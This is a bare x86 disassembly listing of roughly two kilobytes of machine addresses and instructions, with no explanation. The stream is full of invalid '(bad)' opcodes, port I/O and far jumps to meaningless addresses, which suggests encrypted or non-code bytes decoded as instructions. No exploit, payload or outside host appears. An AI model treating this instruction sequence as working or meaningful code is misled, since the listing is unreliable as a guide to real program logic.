  420722:	fcom   QWORD PTR [edx]
  420724:	cmp    ebp,ecx
  420726:	scas   eax,DWORD PTR es:[edi]
  420727:	xor    ebp,DWORD PTR [ebx]
  420729:	pop    edx
  42072a:	or     ebp,edx
  42072c:	pop    ecx
  42072d:	xchg   BYTE PTR [edx],cl
  42072f:	inc    edi
  420730:	jo     0x4206de
  420732:	push   edi
  420733:	mov    eax,0x16a0e72c
  420738:	in     eax,0x8b
  42073a:	or     BYTE PTR [ebx+0x3],0xfa
  42073e:	mov    edx,0xd7b5dcb6
  420743:	mov    ds:0xa7593d65,al
  420748:	jo     0x420729
  42074a:	ds loopne 0x42075a
  42074d:	stc    
  42074e:	adc    al,0x11
  420750:	aad    0xd9
  420752:	xchg   ebx,eax
  420753:	(bad)  
  420754:	jb     0x4207c0
  420756:	lods   eax,DWORD PTR ds:[esi]
  420757:	xor    DWORD PTR [edi],esi
  420759:	sub    BYTE PTR [esi+0x9],dh
  42075c:	ret    0x6938
  42075f:	mov    al,0x32
  420761:	mov    edx,0x4c4ede13
  420766:	out    0x94,al
  420768:	cmp    eax,0x56103482
  42076d:	jmp    0xe5fd1f4d
  420772:	xor    ch,BYTE PTR [edx+edx*4+0x3dc90c32]
  420779:	mov    edi,0xf640132f
  42077e:	mov    ds:0xce64629a,al
  420783:	cmp    eax,0x14df833d
  420788:	xchg   ebx,ebx
  42078a:	jae    0x4207bf
  42078c:	pop    es
  42078d:	popa   
  42078e:	test   DWORD PTR ss:[esi+0xc],esp
  420792:	call   0xed5d:0x90dd1a54
  420799:	test   al,0x5a
  42079b:	adc    dh,dh
  42079d:	scas   al,BYTE PTR es:[edi]
  42079e:	jmp    0xf6d3:0x43beef8c
  4207a5:	das    
  4207a6:	cmp    ebp,DWORD PTR [edi-0x3b78e218]
  4207ac:	push   ebx
  4207ad:	and    DWORD PTR [edi-0x2c],0x44f49290
  4207b4:	or     bl,BYTE PTR [edx+0x2e5a4ce7]
  4207ba:	aad    0x7d
  4207bc:	add    BYTE PTR [edi+0x6dac0a97],dh
  4207c2:	repnz inc ebp
  4207c4:	add    BYTE PTR [ecx+0x5b],dh
  4207c7:	push   esi
  4207c8:	sub    esi,eax
  4207ca:	int3   
  4207cb:	imul   edi,DWORD PTR [esp+edx*8],0xfffffffe
  4207cf:	rol    DWORD PTR [ebx-0x2f4cd223],cl
  4207d5:	jl     0x4207a5
  4207d7:	nop
  4207d8:	imul   edx,DWORD PTR [edx],0xa
  4207db:	push   ss
  4207dc:	out    0x31,al
  4207de:	sahf   
  4207df:	repnz stos DWORD PTR es:[edi],eax
  4207e1:	sub    DWORD PTR [ebp+ebx*2-0x10577509],eax
  4207e8:	mov    edx,0xa7dfe9be
  4207ed:	sti    
  4207ee:	ret    
  4207ef:	adc    BYTE PTR [ebp+0x3c],cl
  4207f2:	fisttp DWORD PTR [edx]
  4207f4:	dec    ebp
  4207f5:	add    edx,DWORD PTR [esi]
  4207f7:	mov    bl,0x7
  4207f9:	sbb    cl,cl
  4207fb:	test   al,0x83
  4207fd:	loop   0x420813
  4207ff:	call   0x9051:0x1bc293bb
  420806:	xlat   BYTE PTR ds:[ebx]
  420807:	push   eax
  420808:	stos   BYTE PTR es:[edi],al
  420809:	ins    BYTE PTR es:[edi],dx
  42080a:	push   ebx
  42080b:	inc    eax
  42080c:	inc    ebx
  42080d:	dec    ebx
  42080e:	dec    ecx
  42080f:	retf   0xc819
  420812:	lods   eax,DWORD PTR ds:[esi]
  420813:	xor    eax,0xfb9d51cc
  420818:	xchg   ecx,eax
  420819:	fisub  WORD PTR [ebx+0x6b]
  42081c:	and    edi,DWORD PTR [ebx]
  42081e:	data16 sti 
  420820:	adc    eax,0x95302e4b
  420825:	cs pop ecx
  420827:	inc    esp
  420828:	sbb    eax,0x6bf81442
  42082d:	inc    esp
  42082e:	xchg   esp,eax
  42082f:	add    bh,ah
  420831:	iret   
  420832:	popf   
  420833:	int3   
  420834:	push   ebp
  420835:	xchg   BYTE PTR [ecx],bl
  420837:	scas   eax,DWORD PTR es:[edi]
  420838:	cmp    eax,0x430d6331
  42083d:	pop    ecx
  42083e:	inc    esi
  42083f:	mov    dl,0xf3
  420841:	push   edx
  420842:	jmp    0x3447:0xc1bcf8d5
  420849:	retf   
  42084a:	dec    edx
  42084b:	push   ss
  42084c:	mov    ds:0x6239c16a,eax
  420851:	call   0xf1c7:0x9ef67feb
  420858:	nop
  420859:	imul   eax,DWORD PTR [eax+0x59],0x6697dc20
  420860:	test   BYTE PTR [edx-0x3739954f],ah
  420866:	add    BYTE PTR [eax],0xa1
  420869:	fnstcw WORD PTR [ebp+0x0]
  42086c:	stos   BYTE PTR es:[edi],al
  42086d:	sti    
  42086e:	add    BYTE PTR [eax+0x281b32a0],bh
  420874:	nop
  420875:	sub    al,0xb3
  420877:	sahf   
  420878:	aaa    
  420879:	retf   
  42087a:	gs pushf 
  42087c:	inc    eax
  42087d:	loopne 0x4208ca
  42087f:	jbe    0x42089e
  420881:	call   0xb47f:0x853deb17
  420888:	xchg   DWORD PTR [ebp-0x29],edx
  42088b:	jl     0x42088a
  42088d:	adc    BYTE PTR [edx+0xf7b63d9],bh
  420893:	lods   al,BYTE PTR ds:[esi]
  420894:	or     BYTE PTR [ebp+0x23],0x30
  420898:	pop    ds
  420899:	fmul   st,st(3)
  42089b:	(bad)  
  42089c:	push   ebx
  42089d:	mov    eax,0x1d884b35
  4208a2:	sub    bl,ch
  4208a4:	fwait
  4208a5:	xor    eax,0xe573b2a6
  4208aa:	jg     0x420859
  4208ac:	(bad)  
  4208ad:	dec    eax
  4208ae:	mov    al,ds:0xef398427
  4208b3:	mov    ebp,0x2aaee3fc
  4208b8:	cmovo  ebp,ebx
  4208bb:	test   al,0x26
  4208bd:	or     dl,BYTE PTR [ebp-0x3f]
  4208c0:	stc    
  4208c1:	jo     0x4208bc
  4208c3:	inc    ebp
  4208c4:	mov    dl,0x1b
  4208c6:	pop    ss
  4208c7:	jb     0x4208ae
  4208c9:	es loop 0x42091c
  4208cc:	sahf   
  4208cd:	mov    edi,edi
  4208cf:	out    0x45,eax
  4208d1:	xor    BYTE PTR [esi-0x215260e8],cl
  4208d7:	ins    BYTE PTR es:[edi],dx
  4208d8:	cmp    ebp,ecx
  4208da:	fcomp  QWORD PTR [eax+0xa6c5]
  4208e0:	or     BYTE PTR [eax],bl
  4208e2:	and    ah,BYTE PTR [ebp+edi*1-0xe]
  4208e6:	push   ds
  4208e7:	(bad)  
  4208e8:	lods   al,BYTE PTR ds:[esi]
  4208e9:	gs dec cl
  4208ec:	imul   ah
  4208ee:	rcr    BYTE PTR [eax+edx*8+0x21],1
  4208f2:	mov    dl,0xf8
  4208f4:	repnz jmp 0x44fd:0x3d919e5c
  4208fc:	xor    bl,dl
  4208fe:	xor    al,0xde
  420900:	sbb    DWORD PTR [ecx+0xa],ebx
  420903:	cmp    al,BYTE PTR [ebp-0x2b4b7b1e]
  420909:	ins    BYTE PTR es:[edi],dx
  42090a:	mov    esi,0xeaa31156
  42090f:	out    0xd9,al
  420911:	in     eax,0x81
  420913:	stos   BYTE PTR es:[edi],al
  420914:	jmp    0x935b:0x94033046
  42091b:	dec    edi
  42091c:	into   
  42091d:	mov    esp,0x1018146a
  420922:	lods   eax,DWORD PTR ds:[esi]
  420923:	lea    edi,[ecx+0x494754e3]
  420929:	sbb    eax,DWORD PTR ss:[ebp-0xc8bc1ef]
  420930:	xor    ebp,DWORD PTR [eax+0x2f]
  420933:	fisttp QWORD PTR [ebp-0xd]
  420936:	fimul  WORD PTR [edi]
  420938:	sbb    al,BYTE PTR [edi-0x1c]
  42093b:	daa    
  42093c:	or     BYTE PTR [edx+esi*2-0x7f],bh
  420940:	ja     0x420991
  420942:	mov    ebx,0xb6ada964
  420947:	loop   0x420924
  420949:	pop    edx
  42094a:	jo     0x4208e8
  42094c:	jecxz  0x4208f0
  42094e:	mov    cl,0x7c
  420950:	in     eax,0x3b
  420952:	jns    0x4209ba
  420954:	aad    0x3d
  420956:	addr16 out 0xf8,al
  420959:	sbb    DWORD PTR [edi-0x2d],0x63
  42095d:	push   ecx
  42095e:	xchg   DWORD PTR [esi],esp
  420960:	push   cs
  420961:	inc    edi
  420962:	stos   DWORD PTR es:[edi],eax
  420963:	dec    edi
  420964:	jns    0x42090e
  420966:	lds    eax,FWORD PTR [eax+0x633f7e43]
  42096c:	pop    ecx
  42096d:	jo     0x420915
  42096f:	sub    ah,bh
  420971:	sbb    DWORD PTR [esi+0x5bf846ce],esi
  420977:	or     BYTE PTR [edx+0xe332afe],dl
  42097d:	add    ebx,DWORD PTR [esi]
  42097f:	fnstenv [edx]
  420981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420982:	es and al,0x2c
  420985:	pause  
  420987:	inc    esi
  420988:	call   0xa6faab59
  42098d:	inc    edx
  42098e:	mov    bh,0x49
  420990:	sahf   
  420991:	stos   BYTE PTR es:[edi],al
  420992:	aam    0xa5
  420994:	pop    ebp
  420995:	stc    
  420996:	aas    
  420997:	xchg   esi,eax
  420998:	jmp    0x420a12
  42099a:	jbe    0x4209e1
  42099c:	pop    es
  42099d:	and    edx,0x49d8c650
  4209a3:	push   cs
  4209a4:	std    
  4209a5:	test   al,0xdd
  4209a7:	mov    ecx,ds
  4209a9:	not    DWORD PTR [ebx]
  4209ab:	jmp    0x3e4:0x261059b1
  4209b2:	sub    eax,ecx
  4209b4:	jb     0x420a32
  4209b6:	mov    bh,BYTE PTR [eax+0x6b]
  4209b9:	sub    ebx,edi
  4209bb:	sub    BYTE PTR [ecx+esi*1-0x6c],ah
  4209bf:	sub    edi,DWORD PTR [esi+0x6a56a9e6]
  4209c5:	and    cl,BYTE PTR [ecx-0x4a54b0c5]
  4209cb:	ror    DWORD PTR [edi],1
  4209cd:	adc    eax,0x45c15679
  4209d2:	pop    edx
  4209d3:	into   
  4209d4:	jmp    0x420a12
  4209d6:	loope  0x420a4c
  4209d8:	xor    eax,eax
  4209da:	jecxz  0x4209dd
  4209dc:	dec    esp
  4209dd:	sbb    esp,DWORD PTR [eax]
  4209df:	mov    ebx,0xe20c1066
  4209e4:	adc    DWORD PTR [eax+0x71],edi
  4209e7:	mov    al,0x49
  4209e9:	and    eax,0xe9df99b8
  4209ee:	push   es
  4209ef:	(bad)  
  4209f0:	pop    es
  4209f1:	mov    BYTE PTR [ecx-0x4a4b09d6],dh
  4209f7:	in     al,dx
  4209f8:	std    
  4209f9:	das    
  4209fa:	es test eax,0x4b87acea
  420a00:	sahf   
  420a01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a02:	les    edi,FWORD PTR [edx]
  420a04:	lds    edx,FWORD PTR [esi-0x47fe27e8]
  420a0a:	pop    ebp
  420a0b:	add    ebx,DWORD PTR [esi]
  420a0d:	mov    esp,0xb29aa406
  420a12:	push   ds
  420a13:	push   cs
  420a14:	call   0x6cef:0x204c8778
  420a1b:	loopne 0x4209d8
  420a1d:	cmp    dl,ch
  420a1f:	dec    esp
  420a20:	inc    esi
  420a21:	aad    0x5a
  420a23:	pop    edi
  420a24:	es cmp dh,dl
  420a27:	in     eax,0xf1
  420a29:	mov    cl,0x4c
  420a2b:	mov    ss,WORD PTR [esi]
  420a2d:	test   eax,0x3c3a9fd5
  420a32:	leave  
  420a33:	sub    eax,0x5bba76f6
  420a38:	test   eax,0x708ba86
  420a3d:	rep ins BYTE PTR es:[edi],dx
  420a3f:	iret   
  420a40:	mov    dl,0xfc
  420a42:	std    
  420a43:	push   ebp
  420a44:	pusha  
  420a45:	test   dh,ah
  420a47:	addr16 adc eax,0x1c48949d
  420a4d:	mov    ebx,0x9a2b01fb
  420a52:	jbe    0x420aa8
  420a54:	dec    esi
  420a55:	add    bh,al
  420a57:	dec    edi
  420a58:	jb     0x4209f7
  420a5a:	adc    BYTE PTR [ebp+0x7d],ah
  420a5d:	inc    bp
  420a5f:	jb     0x420a4e
  420a61:	out    0x68,eax
  420a63:	lea    ebx,[ebx]
  420a65:	(bad)  
  420a66:	jmp    0x523e2041
  420a6b:	cmp    eax,0x6516052c
  420a70:	cmp    edi,DWORD PTR ds:0xfd1ece47
  420a76:	lahf   
  420a77:	daa    
  420a78:	adc    ch,bh
  420a7a:	dec    BYTE PTR [ebp+0x1c4fb1fd]
  420a80:	inc    esp
  420a81:	push   ebx
  420a82:	shl    BYTE PTR [edx-0x59],cl
  420a85:	sbb    DWORD PTR [edx],ebx
  420a87:	inc    edx
  420a88:	leave  
  420a89:	addr16 in eax,dx
  420a8b:	enter  0x3a56,0xd0
  420a8f:	shl    BYTE PTR [edi-0x1cf81376],1
  420a95:	(bad)  
  420a97:	adc    cl,BYTE PTR [eax+0x40bdf2bd]
  420a9d:	(bad)  
  420a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a9f:	mov    al,ds:0x2877f090
  420aa4:	push   edi
  420aa5:	dec    eax
  420aa6:	lods   al,BYTE PTR ds:[esi]
  420aa7:	in     al,0xa
  420aa9:	and    DWORD PTR [esi+edi*4-0x6b],eax
  420aad:	xchg   DWORD PTR [ecx+0x3c002004],ebx
  420ab3:	xchg   DWORD PTR [ebx-0x4f],edx
  420ab6:	mov    al,0xe5
  420ab8:	ror    DWORD PTR [esi+0x3999b847],cl
  420abe:	cwde   
  420abf:	sar    DWORD PTR [ecx-0x80],0x47
  420ac3:	and    al,0xee
  420ac5:	mov    al,0x20
  420ac7:	sbb    bl,bl
  420ac9:	je     0x420a76
  420acb:	popa   
  420acc:	mov    edi,0x926c550c
  420ad1:	cmp    BYTE PTR [esi-0x30a5deca],0x62
  420ad8:	js     0x420a5c
  420ada:	aas    
  420adb:	xor    al,0xa4
  420add:	sub    edx,DWORD PTR [edi]
  420adf:	jbe    0x420b5e
  420ae1:	jmp    0x77894de9
  420ae6:	sub    eax,0xa4ca5629
  420aeb:	out    dx,al
  420aec:	gs jecxz 0x420a8a
  420aef:	mov    eax,0x4419f5e4
  420af4:	add    BYTE PTR [edx],cl
  420af6:	push   esi
  420af7:	outs   dx,BYTE PTR ds:[esi]
  420af8:	leave  
  420af9:	in     al,dx
  420afa:	dec    esp
  420afb:	add    DWORD PTR [ebp-0x46709fe3],esi
  420b01:	xor    BYTE PTR [ebx+edi*4-0x1a],bh
  420b05:	pop    ecx
  420b06:	pmaxsw mm3,QWORD PTR [edx]
  420b09:	pop    ebp
  420b0a:	mov    eax,ds:0x1b37e779
  420b0f:	cld    
  420b10:	mov    esi,0x5592f6c1
  420b15:	in     eax,0xbe
  420b17:	xchg   ebp,eax
  420b18:	push   esp
  420b19:	sti    
  420b1a:	or     eax,0xee8cff24
  420b1f:	dec    ecx
  420b20:	sbb    ebp,DWORD PTR [ebp-0xe]
  420b23:	dec    ebp
  420b24:	lods   eax,DWORD PTR ds:[esi]
  420b25:	loope  0x420b27
  420b27:	int    0x72
  420b29:	call   0xa96b:0x5b6101ab
  420b30:	jmp    0xf9d11acb
  420b35:	mov    edi,0x5efea417
  420b3a:	mov    dh,0x5b
  420b3c:	es ss nop
  420b3f:	(bad)  
  420b40:	jmp    0x8df30283
  420b45:	xor    BYTE PTR [ecx+0xbf8336c],bh
  420b4b:	popa   
  420b4c:	push   ecx
  420b4d:	and    eax,0xc0654e18
  420b52:	cmp    eax,0x529978c8
  420b57:	push   es
  420b58:	and    ch,BYTE PTR [ebx-0x6d]
  420b5b:	lods   eax,DWORD PTR ds:[esi]
  420b5c:	and    BYTE PTR [edi+0x62],dh
  420b5f:	loopne 0x420b3c
  420b61:	jge    0x420b5c
  420b63:	pop    es
  420b64:	pop    ss
  420b65:	sahf   
  420b66:	sub    BYTE PTR [edi+0xc6df6b6],al
  420b6c:	mov    edx,0x6229c77a
  420b71:	lea    ecx,[edi-0x6b0730f7]
  420b77:	add    dl,ch
  420b79:	(bad)  
  420b7a:	aaa    
  420b7b:	jp     0x420b39
  420b7d:	jecxz  0x420b15
  420b7f:	dec    edx
  420b80:	dec    eax
  420b81:	sbb    DWORD PTR [eax-0x12c9f260],eax
  420b87:	adc    DWORD PTR [edx],ecx
  420b89:	dec    edx
  420b8a:	cmp    al,0x8c
  420b8c:	stos   DWORD PTR es:[edi],eax
  420b8d:	adc    eax,0x977eed1c
  420b92:	mov    ch,0x91
  420b94:	ror    BYTE PTR [ebp-0x25],0xee
  420b98:	mov    al,ds:0x100c6d03
  420b9d:	bound  ebp,QWORD PTR [esi]
  420b9f:	xor    BYTE PTR [ecx],bl
  420ba1:	enterw 0x9935,0xed
  420ba6:	aam    0xa6
  420ba8:	test   BYTE PTR [eax],dl
  420baa:	mov    ch,0xc2
  420bac:	rcr    BYTE PTR [ecx+0x7cf830d0],1
  420bb2:	xor    al,0x1
  420bb4:	push   edx
  420bb5:	call   0x72fd9335
  420bba:	es jecxz 0x420c28
  420bbd:	pop    ds
  420bbe:	daa    
  420bbf:	dec    esi
  420bc0:	aaa    
  420bc1:	jmp    0xf954:0xfc23d003
  420bc8:	adc    edx,edi
  420bca:	mov    cl,0x4f
  420bcc:	mov    ds:0xa557472,al
  420bd1:	sahf   
  420bd2:	inc    esp
  420bd3:	aaa    
  420bd4:	lods   eax,DWORD PTR ds:[esi]
  420bd5:	add    BYTE PTR [edi],ch
  420bd7:	pop    ds
  420bd8:	cmp    eax,0x34070d38
  420bdd:	inc    esp
  420bde:	clc    
  420bdf:	mov    dl,0xb0
  420be1:	jl     0x420c2e
  420be3:	jp     0x420c19
  420be5:	daa    
  420be6:	into   
  420be7:	dec    esp
  420be8:	and    eax,0xffaeee4e
  420bed:	ss xchg ebp,eax
  420bef:	mov    dl,0x93
  420bf1:	xor    dh,BYTE PTR fs:[ebp+0x33]
  420bf5:	xor    BYTE PTR [eax+ebp*4-0x3b],al
  420bf9:	daa    
  420bfa:	popa   
  420bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bfc:	jp     0x420c14
  420bfe:	push   0x92d6457
  420c03:	push   ecx
  420c04:	das    
  420c05:	arpl   bp,cx
  420c07:	sahf   
  420c08:	mov    edi,0xf77f84a4
  420c0d:	fbstp  TBYTE PTR [esi]
  420c0f:	fs inc ecx
  420c11:	mov    dl,dh
  420c13:	add    al,0x92
  420c15:	sbb    al,BYTE PTR [edi+ebp*2-0x36]
  420c19:	or     BYTE PTR [eiz*8+0x3db197b5],bl
  420c20:	lahf   
  420c21:	pop    ebp
  420c22:	sti    
  420c23:	mov    edx,0x60fdc1b8
  420c28:	mov    al,0xc3
  420c2a:	xor    BYTE PTR [ecx-0x6082c39d],ah
  420c30:	outs   dx,DWORD PTR ds:[esi]
  420c31:	dec    ebx
  420c32:	enter  0x82b5,0xf6
  420c36:	bound  edx,QWORD PTR [ebx]
  420c38:	or     al,0xb1
  420c3a:	xchg   edx,eax
  420c3b:	add    al,0x81
  420c3d:	stc    
  420c3e:	pop    ecx
  420c3f:	scas   eax,DWORD PTR es:[edi]
  420c40:	push   edx
  420c42:	and    al,0xaf
  420c44:	mov    esp,0x615d858b
  420c49:	mov    WORD PTR [esi-0x52],?
  420c4c:	mov    esi,0xe094a2ef
  420c51:	mov    ds:0x7360d3d2,al
  420c56:	mov    dh,0x3a
  420c58:	adc    eax,DWORD PTR [ebx-0x27570c4f]
  420c5e:	test   al,0x52
  420c60:	jp     0x420c4a
  420c62:	je     0x420c4f
  420c64:	pop    ebp
  420c65:	xchg   ecx,eax
  420c66:	xor    DWORD PTR [ecx+0x23],0xc497bd1e
  420c6d:	cmp    al,0xa0
  420c6f:	cld    
  420c70:	mov    dl,0x12
  420c72:	pushf  
  420c73:	adc    eax,0x20cd1b3e
  420c78:	test   eax,0x190d4279
  420c7d:	(bad)  
  420c7e:	xor    al,0xe1
  420c80:	fcomp  QWORD PTR [ebp-0x2b]
  420c83:	or     BYTE PTR [ecx],al
  420c85:	sub    bl,BYTE PTR [ebx-0x6f]
  420c88:	fnstenv [edx-0x16]
  420c8b:	mov    edi,0xb2fbc2a5
  420c90:	(bad)  
  420c91:	fs dec ecx
  420c93:	push   esi
  420c94:	in     al,dx
  420c95:	cmp    al,0x2e
  420c97:	int3   
  420c98:	mov    bh,0xf4
  420c9a:	into   
  420c9b:	(bad)  
  420c9c:	push   esi
  420c9d:	pop    ebx
  420c9e:	push   ebx
  420c9f:	fcmovnbe st,st(4)
  420ca1:	(bad)  
  420ca2:	cmp    eax,0xc78ee58
  420ca7:	mov    ds:0xc53cc523,al
  420cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cad:	iret   
  420cae:	loope  0x420d2d
  420cb0:	loope  0x420c36
  420cb2:	cmp    eax,0xe1ad8df1
  420cb7:	dec    esp
  420cb8:	addr16 pop ebp
  420cba:	cmp    eax,0xb57991a7
  420cbf:	inc    esp
  420cc0:	adc    ecx,DWORD PTR [edx]
  420cc2:	out    0xac,al
  420cc4:	fstp   st(6)
  420cc6:	imul   ebp,ebp,0x7
  420cc9:	xor    eax,0x3e0b271f
  420cce:	fdiv   QWORD PTR [ecx+0x9b55691]
  420cd4:	fisub  WORD PTR [esi+0x7b2f68d3]
  420cda:	push   ss
  420cdb:	lea    edi,[ecx]
  420cdd:	inc    edi
  420cde:	and    ebx,DWORD PTR es:[ebp+edx*4-0x4d0e818e]
  420ce6:	cli    
  420ce7:	aad    0xa8
  420ce9:	pop    edx
  420cea:	loop   0x420d21
  420cec:	das    
  420ced:	(bad)  
  420cee:	das    
  420cef:	leave  
  420cf0:	pop    esp
  420cf1:	fisttp QWORD PTR [ecx+0x383bf4b3]
  420cf7:	jp     0x420d6a
  420cf9:	or     edi,DWORD PTR [esp+edi*2-0x408c4dbf]
  420d00:	leave  
  420d01:	fbstp  TBYTE PTR [edx+0x69e2d27b]
  420d07:	xor    al,0x7b
  420d09:	pop    esp
  420d0a:	xor    ecx,DWORD PTR [esi]
  420d0c:	or     al,0x8d
  420d0e:	pop    esp
  420d0f:	and    edx,esp
  420d11:	push   edi
  420d12:	add    al,0x90
  420d14:	dec    edi
  420d15:	dec    ecx
  420d16:	fdiv   st,st(3)
  420d18:	sti    
  420d19:	sub    DWORD PTR [ecx+0xb],0x61573ec8
  420d20:	js     0x420d78
  420d22:	addr16 mov eax,ds:0x3b37
  420d26:	pop    eax
  420d27:	ins    DWORD PTR es:[edi],dx
  420d28:	and    esp,DWORD PTR [eax+ebx*2+0x1a]
  420d2c:	pop    edx
  420d2d:	xchg   edx,eax
  420d2e:	push   edx
  420d2f:	mov    edx,DWORD PTR [ebp-0x48]
  420d32:	jmp    0x423080
  420d37:	sub    eax,0xe7c03733
  420d3c:	fsub   QWORD PTR [ebp-0x7d]
  420d3f:	(bad)  [esi-0x53]
  420d42:	jle    0x420d40
  420d44:	(bad)  
  420d46:	or     eax,edx
  420d48:	mov    bh,0x61
  420d4a:	bound  edx,QWORD PTR [ecx+0x5f]
  420d4d:	bound  esp,QWORD PTR [edx-0x1f]
  420d50:	mov    ecx,DWORD PTR [ebx+0xb7e7279]
  420d56:	mov    eax,0xeb564d54
  420d5b:	jecxz  0x420d5e
  420d5d:	ins    DWORD PTR es:[edi],dx
  420d5e:	leave  
  420d5f:	cld    
  420d60:	mov    dh,0x19
  420d62:	ret    
  420d63:	in     eax,dx
  420d64:	(bad)  
  420d65:	or     esp,DWORD PTR [ebp-0x2d]
  420d68:	dec    ebx
  420d69:	in     eax,0xb0
  420d6b:	push   eax
  420d6c:	xor    DWORD PTR [ecx],eax
  420d6e:	sti    
  420d6f:	int3   
  420d70:	dec    edi
  420d71:	jle    0x420df0
  420d73:	dec    edx
  420d74:	pop    ss
  420d75:	sub    eax,0x68255428
  420d7a:	adc    eax,edi
  420d7c:	sbb    BYTE PTR [eax+0x705be861],ch
  420d82:	xor    BYTE PTR [esi+0x4d81ce2b],cl
  420d88:	adc    al,0x13
  420d8a:	aaa    
  420d8b:	loope  0x420dc0
  420d8d:	xchg   ebp,eax
  420d8e:	arpl   WORD PTR ds:0x58752444,dx
  420d94:	or     eax,0xc8a3484a
  420d99:	aad    0x6d
  420d9b:	mul    BYTE PTR [edi-0x41a0dd4e]
  420da1:	jmp    0x9a90:0x36995aff
  420da8:	dec    eax
  420da9:	pushf  
  420daa:	ds dec edi
  420dac:	lds    ecx,FWORD PTR [edx+0x4cc134ba]
  420db2:	leave  
  420db3:	cwde   
  420db4:	or     BYTE PTR [ebx+0x37],cl
  420db7:	mov    bl,0x99
  420db9:	mov    al,0x63
  420dbb:	(bad)  
  420dbc:	repz cmp DWORD PTR [ebp+edi*2-0x3a],0xc3bf0caf
  420dc5:	cmp    eax,DWORD PTR [eax]
  420dc7:	pop    edx
  420dc8:	call   0x93ce13c
  420dcd:	ror    DWORD PTR [ebp-0x292f90e6],1
  420dd3:	push   esp
  420dd4:	stc    
  420dd5:	mov    ds,esp
  420dd7:	clc    
  420dd8:	out    dx,eax
  420dd9:	mov    al,ds:0x32b6abea
  420dde:	fnsave [edx-0x2f]
  420de1:	xchg   edi,eax
  420de2:	retf   0xee5a
  420de5:	in     al,dx
  420de6:	fiadd  DWORD PTR [ecx-0x1f]
  420de9:	ins    BYTE PTR es:[edi],dx
  420dea:	dec    edx
  420deb:	cmp    al,0x82
  420ded:	(bad)  
  420dee:	jmp    0x4a34344a
  420df3:	out    dx,eax
  420df4:	div    bl
  420df6:	dec    ecx
  420df7:	ja     0x420d9e
  420df9:	pop    esp
  420dfa:	int3   
  420dfb:	mov    bl,0x52
  420dfd:	xchg   ebx,eax
  420dfe:	ficom  DWORD PTR [esi+0x40bce0ab]
  420e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e05:	dec    esp
  420e06:	fstp   TBYTE PTR [edi]
  420e08:	cld    
  420e09:	or     DWORD PTR [ecx],ecx
  420e0b:	lahf   
  420e0c:	dec    eax
  420e0d:	popa   
  420e0e:	mov    ch,0xd9
  420e10:	pop    ecx
  420e11:	sub    ah,BYTE PTR [ecx]
  420e13:	adc    DWORD PTR [eax+ebx*2-0x2c],edi
  420e17:	hlt    
  420e18:	xor    DWORD PTR [eax+0x25],ecx
  420e1b:	lock dec esi
  420e1d:	int    0x2f
  420e1f:	inc    ebx
  420e20:	retf   0x5939
  420e23:	adc    ebx,DWORD PTR [esi-0x2f]
  420e26:	or     al,0x12
  420e28:	test   eax,0x3091038b
  420e2d:	inc    ebp
  420e2e:	popf   
  420e2f:	mov    edx,0xb09e1ade
  420e34:	popa   
  420e35:	out    dx,al
  420e36:	mov    ds,WORD PTR [esi]
  420e38:	pop    eax
  420e39:	sahf   
  420e3a:	xor    ecx,DWORD PTR ds:0x96a67bc2
  420e40:	add    BYTE PTR [edx],cl
  420e42:	inc    ecx
  420e43:	pop    edi
  420e44:	mul    DWORD PTR [ebx+0x5e1eae38]
  420e4a:	mov    cl,0xa4
  420e4c:	sbb    edx,DWORD PTR [edi+0x3aeafefd]
  420e52:	gs xchg ebx,eax
  420e54:	div    esp
  420e56:	into   
  420e57:	jmp    0x931f:0x464be8db
  420e5e:	mov    dl,0x60
  420e60:	pop    esp
  420e61:	sbb    DWORD PTR [edi+0x3a],ebp
  420e64:	push   ss
  420e65:	mov    eax,ds:0x157509a0
  420e6a:	xchg   esi,eax
  420e6b:	es inc edx
  420e6d:	cmp    ebx,DWORD PTR [esi+0x7714e438]
  420e73:	jle    0x420e4c
  420e75:	jno    0x420e74
  420e77:	adc    ch,BYTE PTR [eax+edi*2-0x6aa734d]
  420e7e:	mov    BYTE PTR [esi-0x4008e011],bl
  420e84:	test   DWORD PTR [esi],ebp
  420e86:	mov    ah,0x2c
  420e88:	jp     0x420ea0
  420e8a:	std    
  420e8b:	inc    edi
  420e8c:	sahf   
  420e8d:	inc    edx
  420e8e:	stos   BYTE PTR es:[edi],al
  420e8f:	(bad)  
  420e90:	mov    ch,0xa
  420e92:	ins    DWORD PTR es:[edi],dx
  420e93:	push   edi
  420e94:	and    al,0x97
  420e96:	hlt    
  420e97:	out    dx,eax
  420e98:	shr    esp,0x14
  420e9b:	rcl    ecx,0xd1
  420e9e:	scas   eax,DWORD PTR es:[edi]
  420e9f:	in     al,dx
  420ea0:	sub    BYTE PTR [esi-0x35e7cb55],ch
  420ea6:	in     eax,dx
  420ea7:	mov    esi,0x3bcaf485
  420eac:	retf   0xd04a
  420eaf:	sub    BYTE PTR [edi+0x47],bh
  420eb2:	sbb    eax,0x3397465
  420eb7:	je     0x420ec1
  420eb9:	jg     0x420f2f
  420ebb:	das    
  420ebc:	push   edi
  420ebd:	ja     0x420eb5
  420ebf:	sti    
  420ec0:	sub    al,0xef
  420ec2:	(bad)  
  420ec3:	adc    edx,DWORD PTR [edx-0x13846d9f]
  420ec9:	jmp    0x420f09
  420ecb:	imul   ecx,DWORD PTR [edi-0x22],0xffffffd8
  420ecf:	call   0x39c7:0x5200b9d4
  420ed6:	rol    BYTE PTR [esi-0x24],0xba
  420eda:	mov    cl,0x13
  420edc:	mov    al,0x21
  420ede:	test   al,0xc2
  420ee0:	fld    DWORD PTR [edi+0x7692ff60]
  420ee6:	xor    al,BYTE PTR ds:0xf2e15d02
  420eec:	out    0x10,al
  420eee:	lock sub eax,0x8e327bb5
  420ef4:	push   ebp
  420ef5:	(bad)  
  420ef6:	js     0x420e7d
  420ef8:	pushf  
  420ef9:	ss jmp 0x420f62
  420efc:	jg     0x420eba
  420efe:	ja     0x420f1d
  420f00:	jns    0x420ea7
  420f02:	cmp    al,0x58
  420f04:	or     DWORD PTR [edi-0x23069d6c],eax
  420f0a:	fidivr WORD PTR ds:0x2c80480f
  420f10:	shl    BYTE PTR [edx],1
  420f12:	and    bl,BYTE PTR ds:0xb8e18123
  420f18:	loope  0x420ed1
  420f1a:	dec    esi
